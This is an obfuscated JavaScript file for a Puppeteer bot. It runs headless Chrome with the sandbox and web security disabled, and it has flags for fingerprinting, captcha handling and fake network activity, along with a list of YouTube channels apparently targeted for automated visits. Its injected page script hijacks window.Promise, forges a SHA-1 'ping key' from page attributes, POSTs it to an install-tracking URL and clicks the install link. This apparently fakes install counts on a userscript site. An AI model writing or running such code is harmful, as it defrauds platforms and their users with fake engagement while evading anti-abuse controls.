                J[0x223 + -0x5 * -0x70d + -0x2554] = this['block'], J[K >> -0x13eb + 0xe4e * -0x2 + 0x6ef * 0x7] |= x[0x5 * 0x127 + 0x63c + -0xbfc & K], this['block'] = J[-0x6a3 * -0x2 + -0x1254 + 0x1 * 0x51e], K >= 0x1ba2 + -0x32d * 0x1 + -0x183d && (this['hashed'] || this['hash'](), J[-0x306 * 0x1 + -0x4ed + 0x37 * 0x25] = this['block'], J[-0x10e7 + -0x2126 + -0x1 * -0x321d] = J[-0x33a * -0x1 + -0x13f4 * 0x1 + -0x10bb * -0x1] = J[0x160b + 0x33 * 0x83 + -0x3022] = J[-0x10ee + 0x2d * -0x25 + 0x1772] = J[-0x2337 + 0x161b + 0x460 * 0x3] = J[0xa6 * -0xb + 0x1 * -0xd39 + -0x2 * -0xa30] = J[0x5 * 0x51b + -0x1d79 + 0x3f8] = J[-0xfcc + -0x1 * -0x3a9 + 0xc2a] = J[-0xa5f + 0x1881 + -0xe1a] = J[0x24f5 * 0x1 + -0x149 * 0x4 + -0x1fc8] = J[-0x1304 + -0x4b0 + 0x6 * 0x3f5] = J[0x9 * -0x448 + -0x204c + 0x46df] = J[0x1a6 + -0x164f + 0x14b5] = J[0x623 + 0x2546 + -0xc * 0x39d] = J[-0x16a8 + 0xd * -0x275 + 0x36a7] = J[-0x1b87 + 0x1f37 + 0x3a1 * -0x1] = 0x11e * 0x8 + 0x3 * 0xc8e + -0x2e9a), J[-0x2 * -0x117 + -0x1056 + -0x71b * -0x2] = this['hBytes'] << 0xe09 + -0xb18 + -0x2ee | this['bytes'] >>> -0x250 + 0x43d + -0x10 * 0x1d, J[-0x1164 + -0x13 * 0xee + 0x231d] = this['bytes'] << -0x17d1 + 0x1a35 + 0x1 * -0x261, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = 0xe6 + -0x1330 + 0x125a; J < 0xbc5 + 0x24c + -0x1f7 * 0x7; ++J)
                K = Q[J - (0x745 + -0x112d + 0x9eb)] ^ Q[J - (0x1513 + 0x1af9 + -0x3004)] ^ Q[J - (-0x35f * -0x9 + -0x15e + -0x1ceb)] ^ Q[J - (0xccb + -0x7 * -0x2cc + 0x397 * -0x9)], Q[J] = K << 0x5 * -0x5f3 + 0x12b3 + 0x7b * 0x17 | K >>> 0x76 * -0x3a + 0x1 * 0x16b7 + 0x424 * 0x1;
              for (J = 0x135f + 0x21 * -0xfc + 0xd1d; J < 0x1a0f + -0x1 * 0x46 + 0x19b5 * -0x1; J += -0x2f1 * 0x2 + -0x271 * -0x1 + -0x1 * -0x376)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x6 * -0x225 + 0xed5 * 0x1 + 0xf9 * -0x2 | L >>> 0xc40 * -0x3 + -0x4 * -0x22a + 0x1c33) + (M & N | ~M & O) + P + (-0xb348c * -0xb22 + -0xdff * 0x74831 + -0x14bf * -0x34330) + Q[J] << -0xee5 * -0x2 + 0x13bc + -0x1 * 0x3186) << 0x3 * 0x32d + 0x11 * -0x42 + 0x1 * -0x520 | P >>> -0x1 * -0x1697 + -0x1f5 + -0x1487) + (L & (M = M << -0xb32 + 0x1 * 0x709 + 0x447 | M >>> -0x2653 + -0x1b37 * 0x1 + 0x14 * 0x347) | ~L & N) + O + (-0xf6b * -0x4b824 + -0x2459500f + 0x3618b69c) + Q[J + (0x19c4 * -0x1 + -0x2658 + -0x401d * -0x1)] << 0x2335 * -0x1 + -0x1825 + -0x8e * -0x6b) << -0x2600 + -0x2260 + 0x4865 | O >>> 0x121d + -0x20e2 + -0x220 * -0x7) + (P & (L = L << -0x3bc + 0xfc * -0x27 + 0x2a3e | L >>> 0x15 + -0x191 + 0x17e) | ~P & M) + N + (0xb * -0xecaf1fa + -0xde * 0x3bbabd + -0x17b * -0xce08a7) + Q[J + (0x1e33 + -0x22e0 + 0xb * 0x6d)] << -0x10a2 * -0x2 + 0x378 * -0x4 + -0x1364) << -0x1427 + 0x65b * 0x1 + 0xdd1 | N >>> -0x12e2 + 0x2038 + -0xd3b * 0x1) + (O & (P = P << -0x5 * -0x39b + 0xaed * -0x1 + -0x6fc | P >>> -0x3e * 0x9 + 0xc7 * 0x18 + 0xf8 * -0x11) | ~O & L) + M + (-0x672f1b21 + -0x3fe * 0x28dbb5 + 0x164ceb150) + Q[J + (0xa * -0x22b + -0x1cff * 0x1 + 0x32b0)] << 0x4e2 + -0xe09 + 0xd5 * 0xb) << -0x1d69 * 0x1 + -0x590 + -0x2 * -0x117f | M >>> 0x1956 + 0x1 * 0x1df5 + -0x3730) + (N & (O = O << 0x18dc + -0x6fe + -0x11c0 | O >>> -0x1a9e * 0x1 + -0x1f33 + -0x71 * -0x83) | ~N & P) + L + (0x7e45ca3a + -0x64bebf50 + 0x40fb6eaf) + Q[J + (-0x18df * -0x1 + 0x133d + -0x14c * 0x22)] << -0xa * 0x14e + -0xb1b + 0x2af * 0x9, N = N << -0x251e * 0x1 + -0xf63 + 0x349f | N >>> -0x84e * 0x2 + 0x6ea + 0x9b4;
              for (; J < 0x851 * -0x2 + -0x13f1 + 0x24bb * 0x1; J += -0x1 * 0x158f + 0x6ea + 0xeaa)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x11 * 0x18b + 0x2c0 + -0x1cf6 | L >>> 0x29 * 0xc1 + 0x1e10 + -0x3cde) + (M ^ N ^ O) + P + (-0x2f * -0x43af941 + 0x98eff5bb + -0xf0e9cd09) + Q[J] << 0x1372 + 0xc24 + -0x137 * 0x1a) << 0x1 * 0xdd3 + -0x34d * -0x2 + 0x1468 * -0x1 | P >>> -0x115d + -0x34 * -0x2 + -0x16c * -0xc) + (L ^ (M = M << 0x1b3a + -0x725 + 0x1 * -0x13f7 | M >>> 0x3b1 + 0x217c + -0x37 * 0xad) ^ N) + O + (-0x19 * 0x426d196 + 0x3a245 * -0xdb2 + 0x10868b841) + Q[J + (-0x1 * 0x18c1 + -0x1 * -0x2671 + -0xdaf)] << 0x231b + 0xfd0 + -0x32eb) << 0x237a + -0x9 * -0x25 + -0x24c2 | O >>> -0x1bd * -0x9 + 0x43f * 0x5 + -0x24c5) + (P ^ (L = L << 0x2 * 0x739 + 0x29b * 0x3 + 0x1625 * -0x1 | L >>> -0x7f1 + 0xd * -0x252 + 0x261d) ^ M) + N + (0x4f * 0xa67f41 + -0x5 * 0x2c22a913 + -0x3 * -0x5d61fbfb) + Q[J + (0x903 * 0x2 + 0x1 * 0x191d + -0x3d * 0xb5)] << -0x67d * 0x2 + -0xb * -0x67 + -0xb * -0xc7) << 0x3 * 0x649 + -0x598 + -0x1e * 0x71 | N >>> 0x4d9 * 0x8 + -0x1871 + -0xe3c) + (O ^ (P = P << 0xce + 0x75c + -0x80c | P >>> -0x1aba + 0x6 * 0x40f + 0x5 * 0x7a) ^ L) + M + (0x6 * 0x19ad4951 + -0x1dca14a1 + 0x35d74 * -0x3fd) + Q[J + (-0x399 + -0x17a * -0x14 + -0x19ec)] << -0x8cc + 0x211d + -0x1851) << 0x832 + 0x1fad + -0x27da | M >>> 0x2d * -0x23 + 0x12 * -0xa7 + -0x1 * -0x1200) + (N ^ (O = O << -0x2bf + -0x11e8 + -0xd * -0x199 | O >>> -0x257 * -0x3 + 0x797 + -0x6 * 0x26f) ^ P) + L + (0x18fa4 * 0x69c7 + -0x8fde8377 + -0x1467bf * -0x464) + Q[J + (0x2 * -0x3df + -0x2e * -0x1 + 0x61 * 0x14)] << 0x5 * -0x259 + 0x24dd + -0x20 * 0xc9, N = N << -0x13 * -0x199 + -0x11b2 + 0xd * -0xf7 | N >>> 0x1 * 0x99a + -0xee4 + 0x54c;
              for (; J < -0x1b21 * 0x1 + 0x2416 + 0xcb * -0xb; J += -0x6c4 + 0x109c + -0x9d3 * 0x1)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x1 * 0x1906 + -0x326 + -0x7 * -0x407 | L >>> 0xef1 + -0x26e * 0x10 + 0x180a) + (M & N | M & O | N & O) + P - (0x196a5226 + -0x9ab4ca92 + -0x19c * -0x967b7c) + Q[J] << -0x571 * 0x4 + -0x167 * -0xa + -0x7be * -0x1) << -0x958 + -0x319 * 0xa + -0x2857 * -0x1 | P >>> -0x38 * 0x43 + 0x37 * 0x4f + 0x1 * -0x236) + (L & (M = M << -0x9 * 0x61 + -0x1 * -0x108e + -0x17 * 0x91 | M >>> -0x2182 + 0x10 * 0x225 + -0xcc) | L & N | M & N) + O - (-0x29f48506 + -0x166628e * 0x94 + 0x16a09c242) + Q[J + (0x2 * 0xb5 + 0xa49 + -0x6 * 0x1f3)] << 0xada * -0x2 + -0xd * -0xd6 + -0x26 * -0x49) << -0x2150 + 0x1f9a + 0x1bb | O >>> 0x26 * -0x60 + -0x5fa * 0x3 + 0x2049) + (P & (L = L << -0x1db1 + 0x1e4 * 0xe + 0x357 | L >>> -0xe * -0x1db + -0x359 * -0x6 + -0x2e0e) | P & M | L & M) + N - (0x8a043d * 0xb5 + -0x8ad6400d * 0x1 + -0xfcf55c * -0x9c) + Q[J + (0x1 * -0x17cf + -0x3 * 0x262 + 0x1ef7 * 0x1)] << -0xd02 + -0x6 * -0x4f + -0x4 * -0x2ca) << -0x3fb * 0x7 + 0xd3 * 0x2c + 0x431 * -0x2 | N >>> 0x1 * -0x1def + 0x11f1 * 0x2 + -0x5d8) + (O & (P = P << 0x4fd * 0x7 + 0x6f * -0x38 + -0xa85 | P >>> -0x1 * -0x15d + -0x6 * -0x473 + -0x1c0d) | O & L | P & L) + M - (0xe017880b * 0x1 + -0x1af * -0x7e17cf + -0x8094 * 0x28412) + Q[J + (0x1 * 0x25eb + -0x5ea + -0x1ffe)] << 0x2b * 0x3c + 0xe75 * -0x2 + 0x12d6) << -0x7d6 + 0x2488 + -0x1cad | M >>> -0x1f86 + -0x1d72 + 0x3d13) + (N & (O = O << -0x2cc + 0xa4f + -0x765 | O >>> -0x2044 + 0xce3 * 0x1 + 0x1363) | N & P | O & P) + L - (-0x9cb595d6 + 0xba31a8b2 * 0x1 + 0x29b41824 * 0x2) + Q[J + (-0x1170 + -0x1355 + 0x1 * 0x24c9)] << 0x1cc9 * -0x1 + 0x1 * 0x1229 + 0x1 * 0xaa0, N = N << -0x2c * -0x56 + -0x4 * 0x44f + 0x292 | N >>> -0x22ca + 0x181f + 0xaad;
              for (; J < -0x9b2 + -0x87c + -0x62a * -0x3; J += 0x4d + 0x2 * -0x1195 + -0x1171 * -0x2)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0xf97 + -0x1399 + -0x407 * -0x1 | L >>> 0x79 * -0x41 + -0x662 * 0x2 + 0x2b98) + (M ^ N ^ O) + P - (-0x2d0b978 + -0x53cbfcfb + 0x8c39f49d) + Q[J] << 0x1 * 0x1e3b + 0xae1 * -0x3 + 0x16 * 0x1c) << 0xee9 + 0x13 * 0xaf + 0x75 * -0x3d | P >>> -0xd * -0x26 + -0x237b * 0x1 + 0x21a8) + (L ^ (M = M << -0x7f * 0x35 + 0x3b0 + 0x16b9 | M >>> 0x19f9 + -0x199 * -0x6 + -0x238d) ^ N) + O - (-0x30054e * -0x71 + -0x3 * -0x1d355d4f + -0x37353131) + Q[J + (0x25fa + -0x2f * 0x6b + 0x2 * -0x92a)] << -0x185 * -0x1 + 0xc91 + -0xe16) << 0x2 * 0x84a + 0x148 + -0x11d7 | O >>> -0x375 * 0x4 + 0xeb4 * 0x1 + 0xc5 * -0x1) + (P ^ (L = L << -0x6a9 + -0xeba + -0x1 * -0x1581 | L >>> -0x24fa + -0x1 * 0x1c4b + 0x4147) ^ M) + N - (0x3eeef693 * 0x1 + -0x2924 * -0x65e7 + 0x517 * -0x50c63) + Q[J + (-0x159a + -0x1885 + 0x2e21)] << 0xa6 * 0x21 + -0x49d + 0x1 * -0x10c9) << -0x1cf5 + 0xa5a + 0x12a0 | N >>> 0x1456 + -0x556 * 0x2 + -0x98f * 0x1) + (O ^ (P = P << -0x1a * -0x149 + -0x2f9 * 0xd + -0x25 * -0x25 | P >>> 0x19ad + 0x1bdc + 0x1 * -0x3587) ^ L) + M - (-0x3afb7cb5 + 0x49f41a67 + 0x26a4a078) + Q[J + (-0xcf1 * -0x3 + -0x4 * 0x31a + -0x28 * 0xa9)] << 0x1ee + 0x2170 + 0xbca * -0x3) << -0x1 * 0x1008 + -0x4ed + -0xf * -0x166 | M >>> 0xe60 + 0x454 + -0x211 * 0x9) + (N ^ (O = O << -0x1d79 + -0xc1f + -0x2 * -0x14db | O >>> 0x16ff + 0x3 * 0x1c1 + -0x4 * 0x710) ^ P) + L - (-0x17 * -0x3198219 + 0x4d33 * 0x589b + -0x2b519 * 0x1066) + Q[J + (-0xac6 * 0x1 + 0xa1f + 0xab * 0x1)] << 0x3d * 0x8e + -0x18df + -0x8f7, N = N << 0x616 + -0x9fd * 0x1 + 0x405 | N >>> 0x18af + -0x2667 + 0xdba;
              this['h0'] = this['h0'] + L << 0x6ef + -0x1419 + -0x1 * -0xd2a, this['h1'] = this['h1'] + M << -0xccd + 0xc9c + 0x31, this['h2'] = this['h2'] + N << -0x120 + -0x44d + -0x1 * -0x56d, this['h3'] = this['h3'] + O << -0x1c05 + -0x157a * 0x1 + 0x317f, this['h4'] = this['h4'] + P << 0x55d * -0x3 + -0x1 * 0x1e77 + 0x2e8e;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> -0x1 * 0x21c7 + -0x68f + 0x14e * 0x1f & -0xa46 * -0x1 + 0x1071 + -0x1 * 0x1aa8] + w[J >> 0x1 * -0xf3a + -0x22 * 0x67 + 0x1d00 * 0x1 & 0x517 * -0x2 + -0x1f8a + 0xded * 0x3] + w[J >> -0x18c1 * 0x1 + -0x2 * -0xb1b + 0xb * 0x3d & 0x2 * 0x655 + -0x1aa1 + 0xe06] + w[J >> 0xc4a + -0x1233 + 0xb * 0x8b & -0x1c93 + -0x30 * 0x4e + 0x2b42] + w[J >> -0x1927 + 0xe5 * 0x5 + -0xe * -0x17b & -0x263a + 0x1 * 0x267d + 0x34 * -0x1] + w[J >> 0x7c3 * -0x3 + 0x1a64 + -0x1 * 0x313 & -0x2318 + -0x1 * 0x2443 + 0x21 * 0x22a] + w[J >> -0x91d * 0x2 + -0x1796 + 0x1 * 0x29d4 & -0x10c0 + 0x23f5 + 0x993 * -0x2] + w[0x23a6 + 0x1 * 0xa78 + -0x2e0f & J] + w[K >> 0x259c + -0x1d93 + -0x7ed & -0x5e5 * 0x3 + -0x1f49 + -0x4d * -0xa3] + w[K >> -0x76 + 0x1 * -0x1874 + 0x1902 & -0x313 * -0x3 + -0xdbf * 0x1 + -0x187 * -0x3] + w[K >> 0x3 * -0x8b7 + 0x2330 + -0xff * 0x9 & -0x514 * -0x6 + 0x2657 + 0x5 * -0xdc0] + w[K >> 0x1a2 + -0x108b * 0x2 + 0x1f84 & -0x1086 + 0xfd * -0x20 + 0x3035] + w[K >> 0x1 * -0xf29 + -0x12d * -0x7 + 0x1 * 0x6fa & -0x1 * 0x109 + -0x1 * 0xfe9 + -0x3 * -0x5ab] + w[K >> -0x19b + 0x1d50 + -0x1bad & 0x388 + -0x18c0 + 0x1547] + w[K >> -0xc9b + 0x191 * 0x1 + 0x1 * 0xb0e & -0x17ae * -0x1 + 0x3a * 0x27 + -0x4a3 * 0x7] + w[0x2633 + 0x13d7 * -0x1 + -0x124d & K] + w[L >> -0xf70 + 0x2 * -0x3fd + 0x1786 & 0x25 * 0x107 + 0x1 * -0x212f + -0x4c5] + w[L >> 0x5d9 + -0x156 + -0x179 * 0x3 & -0x1 * 0x14b1 + 0xd * -0x20f + 0x2f83] + w[L >> -0x4c9 * -0x5 + 0x2327 * -0x1 + 0x1 * 0xb4e & -0x6b3 * 0x1 + -0x15d * -0x4 + 0x2 * 0xa7] + w[L >> -0x11ce + -0x1881 + -0x1 * -0x2a5f & -0x1506 + 0x17be + -0x2a9] + w[L >> 0x2254 + 0x1 * 0x26a3 + -0x48eb & -0x10b0 + -0x2d2 * -0x2 + 0x1 * 0xb1b] + w[L >> -0x16 * -0x1e + 0x1e38 + -0x20c4 & 0xf1d * -0x2 + -0x1d * 0xf1 + -0x1ccb * -0x2] + w[L >> -0x1e07 * -0x1 + -0x162c + 0x29d * -0x3 & -0x1704 + -0x2 * 0x12e3 + 0x3cd9] + w[0xcef + 0xd67 + -0x1a47 & L] + w[M >> 0x9b7 + 0x8 * -0x243 + 0x87d & -0x18f3 + -0x1 * 0x12b9 + 0x2bbb] + w[M >> -0x20ad + 0x642 + -0x269 * -0xb & 0x14 * -0x141 + 0x2 * 0x802 + 0x1 * 0x91f] + w[M >> 0x20bd + -0x3 * 0x3 + -0x20a0 & -0xf5 * 0x7 + -0x6 * 0x19e + 0x1076] + w[M >> -0x2126 + 0x2 * 0x493 + 0x1810 & -0x17eb + -0x255 * -0xb + -0x1ad] + w[M >> 0x189 * 0x2 + 0x259 * 0x2 + -0x7b8 & 0x10ef + 0x4d6 + -0x7 * 0x31a] + w[M >> 0x34 * -0x1d + -0x1c5e * -0x1 + -0x1672 & -0x275 + -0x156b + 0x17ef] + w[M >> -0x7ef * 0x3 + -0xf07 * 0x2 + 0x35df * 0x1 & -0xf * -0x1f7 + -0x1ddd + 0x73] + w[-0x1 * 0xb23 + -0x4 * -0x293 + -0x5 * -0x2e & M] + w[N >> -0x2de * 0x7 + 0x1986 + -0x558 & 0x31a * 0xc + -0x79 * -0x2 + 0x1 * -0x261b] + w[N >> -0xc5 * -0x13 + -0x7f7 * -0x1 + -0x167e & 0x59 * 0x4 + -0x1779 + 0x1624] + w[N >> 0x1438 + -0x32e * 0xc + 0x1204 & 0x4 * 0x47a + 0x5a7 * -0x5 + 0xa6a] + w[N >> 0x29c * -0x2 + 0x1edf + -0x1997 * 0x1 & 0xc2d * -0x3 + -0x77 * -0x19 + 0x18f7] + w[N >> 0x1 * 0x1e4d + 0x313 * 0xb + -0x4012 & 0x3b * -0x11 + 0xce4 + -0x8ea] + w[N >> 0x3ac + -0x1 * -0x1fa + -0x59e & 0xc4a + 0x2443 + -0x6 * 0x815] + w[N >> 0x2d4 + -0x218 * -0x7 + -0x1178 & 0xb * 0x1d8 + -0x1d68 + -0x92f * -0x1] + w[-0x1943 + -0x13 * 0x47 + 0x1e97 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> 0x13 * 0x3 + -0x2137 + 0xf2 * 0x23 & 0x1f * -0x1f + 0x1a21 + -0x1561,
                J >> -0x4 * 0xc1 + 0x2 * 0x6a9 + 0x72 * -0x17 & 0xe1d * 0x1 + 0x23b4 + 0x1869 * -0x2,
                J >> 0x509 + -0x2 * 0xc75 + 0x13e9 & -0x1 * 0x14dd + 0x1e * -0xd + -0x29 * -0x92,
                -0x1edb + 0x11 * -0x191 + -0x551 * -0xb & J,
                K >> -0x1 * 0x2206 + 0x10f * 0x3 + -0x1 * -0x1ef1 & -0x4a * -0x43 + -0x39 * 0x29 + -0xa9 * 0xe,
                K >> 0x1 * -0x1fdd + -0x1 * -0x241c + 0x7 * -0x99 & -0x20b * 0x13 + -0x7f6 + -0x5 * -0x98e,
                K >> -0x1 * -0x259a + -0xd * 0xe6 + -0x19e4 & -0x43 * 0x69 + 0x8e4 * 0x4 + -0x716,
                -0x8c7 + -0x345 * 0x4 + 0x5a * 0x41 & K,
                L >> -0x3 * 0xcbb + -0x2152 + 0x479b * 0x1 & -0x10fa + 0x2 * 0x2ae + -0x1 * -0xc9d,
                L >> -0x2 * 0xf77 + -0x202f + 0x150f * 0x3 & 0x197a + 0x26 * -0xcd + -0x1 * -0x5f3,
                L >> -0x63f + 0x1eb * -0x1 + 0x832 & 0x14a * -0x4 + 0x3de + 0x249,
                0x937 * -0x1 + 0x1 * 0x11d1 + -0x79b & L,
                M >> -0x11a5 * -0x1 + 0x18fd + -0x2a8a & -0x1d28 + -0x7 * 0x111 + -0x42e * -0x9,
                M >> 0x1284 + -0x72b + -0xb49 & -0x67 * 0x1 + -0x13ae + 0x1514,
                M >> 0xe * -0x20b + 0x149 * -0x11 + -0x1 * -0x327b & -0x207b + 0x1b1 * 0x14 + -0x5a,
                -0x29 * -0xe9 + -0x1b8b * -0x1 + 0x1 * -0x3fdd & M,
                N >> 0x1 * -0x476 + -0x21a7 + 0x2635 & -0xb * 0xb5 + 0x140b + 0x1 * -0xb45,
                N >> 0x8 * -0x32d + -0x961 + 0x22d9 & -0x197b + -0x326 * -0x2 + 0x1 * 0x142e,
                N >> 0x265 * -0xa + -0xc70 + 0x246a & -0x5fc + -0x82 * 0x1c + -0xc9 * -0x1b,
                0x158e + 0xbad + -0x203c & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(-0xa5c + -0x246 * -0x2 + -0x5e4 * -0x1), (K = new DataView(J))['setUint32'](-0x9 * 0x2cf + -0x616 + 0x7 * 0x47b, this['h0']), K['setUint32'](0x145d + 0x1 * -0x2240 + 0xde7, this['h1']), K['setUint32'](0x949 + 0x145f + -0x3b4 * 0x8, this['h2']), K['setUint32'](-0x263d + 0x45 * 0x29 + -0x3 * -0x914, this['h3']), K['setUint32'](0x15 * 0x57 + -0x1 * 0x116e + -0xb * -0xf1, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[0x58 * -0xb + 0x27 * -0xd3 + 0x23ed];
        return window['Promise'] = class extends window[V(0x11)] {
          constructor(...J) {
            let K = -0x25 * -0x2 + 0x845 + 0x88f * -0x1;
            J[0xb9 * -0x7 + -0x2 * -0x8b4 + -0xc59 * 0x1]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[0xf98 + 0x14df * -0x1 + 0x7 * 0xc1] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), 0x8b * -0x43 + 0x18ec + -0x5bb * -0x2), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = 0x1f0b + -0x8 * 0x33d + -0x522;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, -0xde * 0x13 + 0x2302 + 0x1 * -0xcac), Promise['resolve'](0xf4f * -0x2 + -0x16ec + 0x358b);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = 0x1bec + -0x133c + -0x8b0; j < 0x117 + -0xa5c + 0x946; j++)
    i();
}
const NETWORK_PATIENCE = 0x1e85 * 0x2 + -0x2 * 0x1ad7 + 0x22c * 0xb + (-0x1d33 + -0x1310 + 0x53 * 0xb9) * Math['random'](),
  MM_NETWORK_PATIENCE = (0x17a2 + 0x29 * -0x2 + -0x174d * 0x1) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (0x209f + 0xee * -0xe + 0x689 * -0x3);
    let h = e[f];
    if (b['yuVOyz'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = 0x1bb1 + 0x466 * 0x7 + -0x3a7b, s, t, u = 0x1 * 0x1ed6 + 0x3 * -0x9eb + 0x115 * -0x1; t = n['charAt'](u++); ~t && (s = r % (0xe35 * 0x1 + -0x1 * -0x13ff + -0x2230) ? s * (-0xcc7 * -0x1 + -0x443 + -0x844) + t : t, r++ % (0x24ba + 0x1af9 * 0x1 + 0x77 * -0x89)) ? p += String['fromCharCode'](-0x1 * -0x1345 + 0x25c + -0x14a2 & s >> (-(-0xd6f + -0x1 * 0x20c + -0xd * -0x131) * r & 0x576 * 0x3 + -0x122d + 0xf * 0x1f)) : -0xa * 0x42 + 0x17f1 + 0x71f * -0x3) {
          t = o['indexOf'](t);
        }
        for (let v = 0x4 * -0x2cb + -0x16a * 0x5 + 0x1d3 * 0xa, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](0x33 * 0x31 + 0x107f * -0x2 + 0x59 * 0x43))['slice'](-(-0x1cde + -0x1100 + 0x2de0));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = 0x152b + 0xafe + 0x2029 * -0x1,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0x2 * -0x7dd + 0x833 * 0x3 + -0x8df; u < -0x23ab * 0x1 + 0x1 * -0x1665 + -0xf * -0x3f0; u++) {
          p[u] = u;
        }
        for (u = 0x1f * 0x12d + 0x2a * -0x10 + -0x21d3; u < 0x7d3 * -0x3 + -0x1749 * 0x1 + -0x2fc2 * -0x1; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (-0x1 * -0x2316 + 0x1abd + -0x3cd3), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0xf10 * -0x1 + 0x10df + -0x1fef, q = -0x1e17 + 0x197e + 0xb * 0x6b;
        for (let v = 0x6 * -0x2ab + 0xa94 * -0x3 + 0x2fbe; v < n['length']; v++) {
          u = (u + (0x138c + -0x260f + 0x1284)) % (-0x111d + 0x5 * -0x646 + 0x317b), q = (q + p[u]) % (-0xf5 + -0x1c14 + 0x1e09), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (-0xcfe + -0xfb + 0xef9 * 0x1)]);
        }
        return t;
      };
      b['NcnAnK'] = m, c = arguments, b['yuVOyz'] = !![];
    }
    const j = e[0x69 * -0x57 + -0xef9 + 0x32a8],
      k = f + j,
      l = c[k];
    return !l ? (b['iqWEKh'] === undefined && (b['iqWEKh'] = !![]), h = b['NcnAnK'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = 0x126c * 0x2 + -0x629 + -0x1eaf; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
